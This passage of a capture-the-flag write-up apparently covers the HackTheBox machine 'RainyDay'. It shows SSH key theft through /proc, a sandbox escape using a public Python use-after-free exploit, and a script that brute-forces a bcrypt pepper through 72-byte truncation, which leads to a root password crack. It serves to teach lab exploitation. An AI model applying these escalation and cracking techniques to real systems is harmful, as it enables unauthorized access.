-rw-r--r--    1 1000     1000           807 Jan  6  2022 .profile
drwx------    2 1000     1000          4096 Sep 29 13:47 .ssh
-rw-------    1 1000     1000          1423 Feb 14 18:52 .viminfo
-rw-r-----    1 root     1000            33 Feb  9 22:11 user.txt

```

And even read `user.txt`:

```

/proc/1195 $ cat cwd/user.txt
8ad82817************************

```

There’s also a key in `.ssh`:

```

/proc/1195 $ ls cwd/.ssh
authorized_keys  id_rsa           known_hosts
/proc/1195 $ cat cwd/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA7Ce/LAvrYP84rAa7QU51Y+HxWRC5qmmVX4wwiCuQlDqz73uvRkXq
qdDbDtTCnJUVwNJIFr4wIMrXAOvEp0PTaUY5xyk3KW4x9S1Gqu8sV1rft3Fb7rY1RxzUow
SjS+Ew+ws4cpAdl/BvrCrw9WFwEq7QcskUCON145N06NJqPgqJ7Z15Z63NMbKWRhvIoPRO
JDhAaulvxjKdJr7AqKAnt+pIJYDkDeAfYuPYghJN/neeRPan3ue3iExiLdk7OA/8PkEVF0
...[snip]...

```

It turns out this same vulnerability works in the original container, allowing for skipping of the file read. I’ll look at why in [Beyond Root](#beyond-root).

### SSH

That key works to get a SSH connection as jack on the host:

```

oxdf@hacky$ ssh -i ~/keys/rainyday-jack jack@rainycloud.htb 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-50-generic x86_64)
...[snip]...
jack@rainyday:~$

```

## Shell as jack\_adm

### Enumeration

jack can run `safe_python` as jack\_adm without a password:

```

jack@rainyday:~$ sudo -l
Matching Defaults entries for jack on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on localhost:
    (jack_adm) NOPASSWD: /usr/bin/safe_python *

```

Interestingly, jack can’t read this script:

```

jack@rainyday:~$ cat /usr/bin/safe_python 
cat: /usr/bin/safe_python: Permission denied
jack@rainyday:~$ ls -l /usr/bin/safe_python
-rwxr-x--- 1 root jack_adm 710 Jun  5  2022 /usr/bin/safe_python

```

### safe\_python

#### Find Input

I’ll run the script as jack\_adm and it crashes, trying to open `sys.argv[1]` as a file:

```

jack@rainyday:~$ sudo -u jack_adm safe_python
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 28, in <module>
    with open(sys.argv[1]) as f:
IndexError: list index out of range

```

If I create an empty file and pass that in, nothing happens:

```

jack@rainyday:/tmp$ touch test
jack@rainyday:/tmp$ sudo -u jack_adm safe_python ./test 

```

If I add some text to it, it crashes again:

```

jack@rainyday:/tmp$ sudo -u jack_adm safe_python ./test 
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 29, in <module>
    exec(f.read(), env)
  File "<string>", line 1
    0xdf was here
         ^^^
SyntaxError: invalid syntax

```

It’s passing the contents of the file to `exec`.

#### exec Background

The Python `exec` function is a builtin function [documented here](https://docs.python.org/3/library/functions.html#exec).

> **exec**(*object*, *globals=None*, *locals=None*, */*, *\*\*, \*closure=None*)
>
> This function supports dynamic execution of Python code. *object* must be either a string or a code object.

`safe_python` is calling `exec(f.read(), env)`. `env` is being passed in as `globals`. Later in the docs it says:

> If the *globals* dictionary does not contain a value for the key `__builtins__`, a reference to the dictionary of the built-in module [`builtins`](https://docs.python.org/3/library/builtins.html#module-builtins) is inserted under that key. That way you can control what builtins are available to the executed code by inserting your own `__builtins__` dictionary into *globals* before passing it to [`exec()`](https://docs.python.org/3/library/functions.html#exec).

So basically this is redefining the `__builtins__` dictionary, with the potential of limiting what can be done.

#### Intended Functionality

To test `safe_python`, I’ll write a simple benign Python script and pass it in:

```

jack@rainyday:/tmp$ echo "print('0xdf was here')" > test 
jack@rainyday:/tmp$ sudo -u jack_adm safe_python ./test 
0xdf was here

```

It works fine. If I try to do something a bit more malicious, it fails:

```

jack@rainyday:/tmp$ echo "import os; os.system("id")" > test 
jack@rainyday:/tmp$ sudo -u jack_adm safe_python ./test 
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 29, in <module>
    exec(f.read(), env)
  File "<string>", line 1, in <module>
ImportError: __import__ not found

```

It seems the `__import__` function (used by the `import` keyword) has been removed. How Python’s import system works is nicely described [here](https://tenthousandmeters.com/blog/python-behind-the-scenes-11-how-the-python-import-system-works/). This must be why `safe_python` is “safe”.

### Use-After-Free in Python

#### Background

There’s an issue with Python about how the builtin `memoryview` [function](https://docs.python.org/3/library/functions.html#func-memoryview) has a user-after-free vulenrability in it. This vulnerability was [reported as a crash](https://bugs.python.org/issue15994) in 2012, and remained unresolved and migrated to an [issue on the cpython GitHub](https://github.com/python/cpython/issues/60198), where it remains open into 2023.

[This blog post](https://pwn.win/2022/05/11/python-buffered-reader.html) goes into how the author was able to exploit this vulenrability to get execution. At the very end of the post, there is a section titled “So what?”:

> What’s the point of this whole thing, can’t you just do `os.system(...)`? Well, yes.
>
> Given that you need to be able to execute arbitrary Python code in the first place, this exploit won’t be useful in most settings. However, it may be useful in Python interpreters which are attempting to sandbox your code, through restricting imports or use of [Audit Hooks](https://peps.python.org/pep-0578/), for example. This exploit doesn’t use any imports and doesn’t create any code objects, which will fire `import` and `code.__new__` hooks, respectively. My exploit will only trigger a `builtin.__id__` hook event, which is much more likely to be permitted.

What’s the benefit of this exploit if you can just `os.system(...)`? What about in this scenario where I can’t import `os`?

#### POC

I’ll pull the [exploit script](https://raw.githubusercontent.com/kn32/python-buffered-reader-exploit/master/exploit.py) from GitHub and save a copy on RainyDay. Just running it results in a shell as the running user, jack:

```

jack@rainyday:/dev/shm$ python3 sploit.py 
[*] .dynamic:   0x564935045be8
[*] DT_SYMTAB:  0x564934ae45f8
[*] DT_STRTAB:  0x564934af1300
[*] DT_RELA:    0x564934b4a560
[*] DT_PLTGOT:  0x564935045e08
[*] DT_INIT:    0x564934b4e000
[*] Found system at rela index 97
[*] Full RELRO binary, reading system address from GOT
[*] system:     0x7fc6191bfd60
$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack)

```

But running it with `sudo` and `safe_python` results in a shell as jack\_adm:

```

jack@rainyday:/dev/shm$ sudo -u jack_adm safe_python ./sploit.py 
[*] .dynamic:   0x558397107be8
[*] DT_SYMTAB:  0x558396ba65f8
[*] DT_STRTAB:  0x558396bb3300
[*] DT_RELA:    0x558396c0c560
[*] DT_PLTGOT:  0x558397107e08
[*] DT_INIT:    0x558396c10000
[*] Found system at rela index 97
[*] Full RELRO binary, reading system address from GOT
[*] system:     0x7f4d4a4dcd60
$ id
uid=1002(jack_adm) gid=1002(jack_adm) groups=1002(jack_adm)

```

## Shell as root

### Enumeration

jack\_adm can run `hash_password.py` as root:

```

jack_adm@rainyday:~$ sudo -l
Matching Defaults entries for jack_adm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack_adm may run the following commands on localhost:
    (root) NOPASSWD: /opt/hash_system/hash_password.py

```

Just like above, jack\_adm can’t access the script to see what it does:

```

jack_adm@rainyday:~$ ls -l /opt/hash_system/hash_password.py
ls: cannot access '/opt/hash_system/hash_password.py': Permission denied
jack_adm@rainyday:~$ ls -l /opt/hash_system/
ls: cannot open directory '/opt/hash_system/': Permission denied
jack_adm@rainyday:~$ ls -l /opt/
total 8
drwx--x--x 4 root root 4096 Sep 29 13:47 containerd
drwxr-x--- 3 root root 4096 Oct 19 10:00 hash_system

```

### hash\_password.py

#### Typical Usage

Running it prompts for a password, and then prints a bcrypt hash:

```

jack_adm@rainyday:~$ sudo /opt/hash_system/hash_password.py
Enter Password> 0xdf0xdf
[+] Hash: $2b$05$WE5VLzwKLlJiQM9T0RmwpeM9oTcg7QUJyveu5qTqP8eohInkPuCFG

```

If I give it an empty password, or a long on, it complains and reprompts:

```

jack_adm@rainyday:~$ sudo /opt/hash_system/hash_password.py
Enter Password> 
[+] Invalid Input Length! Must be <= 30 and >0
Enter Password> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] Invalid Input Length! Must be <= 30 and >0
Enter Password>

```

#### Hash Analysis

If I grab the hash produced for “0xdf0xdf” and try to crack it with `john`, it doesn’t:

```

oxdf@hacky$ john 0xdf0xdf.hash --wordlist=<( echo -n "0xdf0xdf" )
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 1 candidate buffered, minimum 12 needed for performance.
0g 0:00:00:00 DONE (2023-02-14 21:25) 0g/s 50.00p/s 50.00c/s 50.00C/s 0xdf0xdf
Session completed. 

```

If I generate a bcrypt hash (perhaps with a website like [this one](https://bcrypt-generator.com/)) and try to crack that the same way, it works:

```

oxdf@hacky$ john 0xdf0xdf.hash --wordlist=<( echo -n "0xdf0xdf" )
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 32 to 4096
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 1 candidate buffered, minimum 12 needed for performance.
0xdf0xdf         (?)     
1g 0:00:00:00 DONE (2023-02-14 21:25) 4.545g/s 4.545p/s 9.090c/s 9.090C/s 0xdf0xdf
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Clearly something is being done to make the hash not match what I’m expecting.

### Recover Secret

#### Strategy

At the start of the box I was able to recover bcrypt hashes for jack, root, and gary. I was able to crack gary’s, but not jack or roots. I also got access as jack by forging a cookie. It seems like the root hash could have been created by this script.

I also know that the output hash doesn’t match standard bcrypt results. The most likely reason for that is that some secret is appended or prepended to the password before it is hashed in the script. If I can figure out what that secret is, I can try again to crack the root password, this time with the appended secret.

The final bit of necessary information is that bcrypt hashes have a [maximum content length](https://dzone.com/articles/be-aware-that-bcrypt-has-a-maximum-password-length), typically up to [72 characters](https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length).

> Passwords that exceed the maximum length will be truncated.

In theory, I could test this if I were able to send matching strings of 72 and 73 characters into the script and see that the results were the same, with the last character of the longer one truncated.

The solution to this challenge is something I showed on [day 20 of HackVent 2022](/hackvent2022/hard#hv2220) - Unicode characters. From that writeup:

```

>>> len('🎅')
1
>>> len('🎅'.encode())
4
>>> len('❗'.encode())
3
>>> len('§'.encode())
2

```

#### Verify Truncation

If my theory is correct, then sending in 20 santa emoji as the password will pass the check of being less than 30 characters, but then expand to be 80 bytes to be hashed. That will be truncated to 72 bytes. If that’s the case, then `john` will crack the resulting hash with 18 santa, not 20.

I’ll try generating the hash for 20 santas:

```

jack_adm@rainyday:~$ sudo /opt/hash_system/hash_password.py
Enter Password> 🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
[+] Hash: $2b$05$P/qVC1tf2gd/.Jsk40ei7uh8e/10V1uqnlrt98Up0pgVPvFymeyoC

```

I’ve got a text file with 16-22 santas per line:

```

oxdf@hacky$ cat santas.txt 
🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅

```

When I pass that to `john`, it cracks:

```

oxdf@hacky$ john santa20.hash --wordlist=santas.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 3 candidates buffered, minimum 12 needed for performance.
🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅 (?)     
1g 0:00:00:00 DONE (2023-02-14 22:06) 50.00g/s 150.0p/s 150.0c/s 150.0C/s 🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅..🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

That password that matched was 18 santas.

This has proved that anything over 72 bytes is truncated, and that I can bypass the length restrictions (to a point) using unicode.

I also know that nothing is being added to the front of the string, because if it was, then `john` wouldn’t crack that hash with 18 santas.

#### Switch to Python

Rather than `john`, I’m going to switch to `python` for verification, as that will allow me to script this. To make sure I know what’s working, I’ll verify the same hash as above:

```

oxdf@hacky$ python
Python 3.8.10 (default, Nov 14 2022, 12:59:47) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import bcrypt
>>> bcrypt.checkpw(("🎅"*18).encode(), b"$2b$05$P/qVC1tf2gd/.Jsk40ei7uh8e/10V1uqnlrt98Up0pgVPvFymeyoC")
True
>>> bcrypt.checkpw(("🎅"*19).encode(), b"$2b$05$P/qVC1tf2gd/.Jsk40ei7uh8e/10V1uqnlrt98Up0pgVPvFymeyoC")
True
>>> bcrypt.checkpw(("🎅"*20).encode(), b"$2b$05$P/qVC1tf2gd/.Jsk40ei7uh8e/10V1uqnlrt98Up0pgVPvFymeyoC")
True
>>> bcrypt.checkpw(("🎅"*17).encode(), b"$2b$05$P/qVC1tf2gd/.Jsk40ei7uh8e/10V1uqnlrt98Up0pgVPvFymeyoC")
False

```

Just like hashing, verification truncates the input at 72 characters, so 18, 19, and 20 santas all return success, but 17 does not.

#### Verify Secret Append

If the script is adding a secret key, it must be to the end of the input password. That means I can send 71 bytes, and then there are only 256 possible options for that last byte (less if I assume it has to be printable so that it can be entered into a web login).

I’ll generate a hash for a password that’s 71 bytes:

```

jack_adm@rainyday:~$ sudo /opt/hash_system/hash_password.py
Enter Password> 🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅🎅AAA
[+] Hash: $2b$05$lO1UZdMYEKrCHU2xY1yXrOw/wJh4BmwUyQE2g6JAQa02yxZwbMQZW

```

If the first character of the secret is “0”, then this would return true:

```

>>> bcrypt.checkpw(("🎅"*17 + "AAA" + "0").encode(), b"$2b$05$lO1UZdMYEKrCHU2xY1yXrOw/wJh4BmwUyQE2g6JAQa02yxZwbMQZW")
False

```

I’ll start with the assumption that the secret will be with printable characters, and in fact, it finds an “H”:

```

>>> import string
>>> hash = b"$2b$05$lO1UZdMYEKrCHU2xY1yXrOw/wJh4BmwUyQE2g6JAQa02yxZwbMQZW"
>>> [c for c in string.printable if bcrypt.checkpw(("🎅"*17 + "AAA" + c).encode(), hash)]
['H']

```

Breaking down that list comprehension a bit, it is creating a list where the entries are the characters (`c`) for each item in `string.printable` but only if `bcrypt.checkpw(("🎅"*17 + "AAA" + c).encode(), hash)`.

#### Script Full Secret

I’ll write a short Python script that will brute force the full secret. I’ll need `bcrypt`, `string`, and `subprocess` (to run the hash program):

```

#!/usr/bin/env python3

import bcrypt
import string
import subprocess

```

I’ll set the secret to an empty string, and start a `while True` loop:

```

secret = ''
while True:

```

On each iteration, I’ll start by calculating the password I need to hash to get one more unknown into the hash:

```

    # generate next password
    pass_len = 71 - len(secret)
    num_santa = pass_len // 4
    num_a = pass_len % 4
    password = "🎅" * num_santa + "A" * num_a

```

Now I’ll hash that password and capture the hash:

```

    # get hash
    proc = subprocess.run(
        ["./cheat/hash_password.py"], input=password.encode(), stdout=subprocess.PIPE
    )
    hash = proc.stdout.split(b" ")[4].strip()

```

Next, I’ll loop over potential characters, checking if any satisfy the hash, and if so, break:

```

    # brute last character
    for c in string.printable[:-6]:
        print(f"\r{secret}{c}", end="")
        if bcrypt.checkpw((password + secret + c).encode(), hash):
            secret += c
            break
    # There is no more character - end loop
    else:
        break

```

When the `for` loop runs without finding success, I’ll break and assume I’ve found the end of the hash.

At the end of the program I’ll print `secret`:

```

print(f"\r{secret:50}")

```

I’ll save this on RainyDay, and run it. It finds the secret in less than two seconds:

```

jack_adm@rainyday:/dev/shm$ time python3 brute.py 
H34vyR41n                                         

real    0m1.561s
user    0m1.031s
sys     0m0.085s

```

### Crack root Hash

#### Create Rule

I’ll create a rules configuration in `john` to append “H34vyR41n” to the end of each word in `rockyou.txt` and check it’s hash. If I try to run with a not yet defined rule, it tells me that rule isn’t in `/opt/john/run/john.conf` (this location will differ depending on how / where you install `john`):

```

oxdf@hacky$ john root.hash --rules=rainyday --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
No "rainyday" mode rules found in /opt/john/run/john.conf

```

I’ll find some of the other parts that start with `[List.Rule:<name>]` and add mine in:

```

# A "no rules" rule for eg. super-fast Single mode (use with --single=none)
[List.Rules:None]
:

[List.Rules:rainyday]
Az"H34vyR41n"

# A "drop all" rule for even faster Single mode (debugging :)
[List.Rules:Drop]
<1'0

```

[This post](https://miloserdov.org/?p=5477) goes into how to append a string as a rule:

![image-20230214202748582](https://0xdfimages.gitlab.io/img/image-20230214202748582.png)

Since `N` is the position, it says to use `z` to append to the end. I’ll save and exit `john.conf`.

#### Recover Password

Now I’ll run `john` with that rule, and it cracks in about a second:

```

oxdf@hacky$ john root.hash --rules=rainyday --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Enabling duplicate candidate password suppressor
246813579H34vyR41n (root)     
1g 0:00:00:01 DONE (2023-02-15 01:26) 0.5405g/s 5137p/s 5137c/s 5137C/s lilgirlH34vyR41n..101086H34vyR41n
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

### su

With the potential root password, I’ll try `su -`, and it works:

```

jack_adm@rainyday:/dev/shm$ su -
Password: 
root@rainyday:~# 

```

And I’ll grab `root.txt`:

```

root@rainyday:~# cat /root/root.txt
5b2508a5************************

```

## Beyond Root

### gary to Shell

The intended path is to work from gary’s container:
- use the file read to get the flask secret
- forging a cookie to get into jacks account
- get into jack’s container
- find the long running sleep process
- use that process to escape the jail, getting access to jack’s home directory and their SSH key

jack’s processes run as uid 1000, where as when I run `id` in gary’s container, it returns 1337. Except that the background process runs as 1000, even as gary:

```

/ $ id
uid=1000 gid=1000

```

With this, from a container stood up under gary’s account, if I get a shell, I can see the long running `sleep`:

```

/ $ ps auxww
PID   USER     TIME  COMMAND 
...[snip]...
1196 1000      0:00 sleep 100000000
...[snip]...

```

Looking closer at the process, it’s the same sleep I abused above:

```

/proc/1196 $ ls -l
total 0
-r--r--r--    1 1000     1000             0 Feb 15 01:48 arch_status
...[snip]...
lrwxrwxrwx    1 1000     1000             0 Feb 10 20:36 cwd -> /home/jack
...[snip]...

```

And read the SSH key:

```

/proc/1196 $ cat cwd/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA7Ce/LAvrYP84rAa7QU51Y+HxWRC5qmmVX4wwiCuQlDqz73uvRkXq
qdDbDtTCnJUVwNJIFr4wIMrXAOvEp0PTaUY5xyk3KW4x9S1Gqu8sV1rft3Fb7rY1RxzUow
SjS+Ew+ws4cpAdl/BvrCrw9WFwEq7QcskUCON145N06NJqPgqJ7Z15Z63NMbKWRhvIoPRO
JDhAaulvxjKdJr7AqKAnt+pIJYDkDeAfYuPYghJN/neeRPan3ue3iExiLdk7OA/8PkEVF0
/pLldRcUB09RUIoMPm8CR7ES/58p9MMHIHYWztcMtjz7mAfTcbwczq5YX3eNbHo9YFpo95
...[snip]...

```

This allows for skipping the dev vhost and the file read entirely.

### Why

So how does this happen? As root, I’ll go take a look at the webapp, `/var/www/rainycloud/app.py`. This is the block of code that handles incoming requests for containers from the “My Containers” page:

```

if action.startswith("create"):
    action_cmd = action[6:]
    port = GetNewPort()
    container_name = f"{action_cmd}-{port}-{session['username']}"
    container_cmd = "sh -c 'touch /logfile; chmod 777 /logfile; tail -f /logfile'"
    docker_client.containers.run(image=container, command=container_cmd, name=container_name, ports={port: port}, detach=True, network="rainyday", publish_all_ports=True, restart_policy={"Name": "always"}, pid_mode="host", privileged=True)
else:
    container = docker_client.containers.get(container)
    if container is None:
        return "Invalid container", 400
    if container.name.split("-")[2] != session['username']:
        return "Unauthorized", 403
    if action == "stop":
        container.stop(timeout=5)
    elif action == "logs":
        logs = container.logs()
        return Response(logs, mimetype="text/plain", headers={"Content-Disposition": "attachment; filename=logs.txt"})
    elif action == "start":
        container.start()
    elif action == "delete":
        if container.attrs['State']['Running']:
            return "Container not stopped", 400
        container.remove()
    elif action.startswith("execdetach"):
        action_cmd = action[10:]
        exit_code, output = container.exec_run(action_cmd, detach=True, privileged=True, user="1000:1000")
    elif action.startswith("exec"):
        action_cmd = action[4:]
        exit_code, output = container.exec_run("timeout 5s " + action_cmd, privileged=True, user="1000:1000" if session['username'] == "jack" else "1337:1337")
        return Response(output, mimetype="text/plain", headers={"Content-Disposition": "attachment; filename=command_output.txt"})

```

I’ll notice that the last one handles if the action starts with “exec”:

```

elif action.startswith("exec"):
    action_cmd = action[4:]
    exit_code, output = container.exec_run("timeout 5s " + action_cmd, privileged=True, user="1000:1000" if session['username'] == "jack" else "1337:1337")

```

It sets the user to “1000:1000” if the session username is jack and “1337:1337” otherwise. So how did I get a shell as 1000:1000? The `elif` before that one is:

```

elif action.startswith("execdetach"):
    action_cmd = action[10:]
    exit_code, output = container.exec_run(action_cmd, detach=True, privileged=True, user="1000:1000")

```

The `execdetach` action (which is what comes from “Execute Command (background)”) always runs as 1000:1000, which is jack.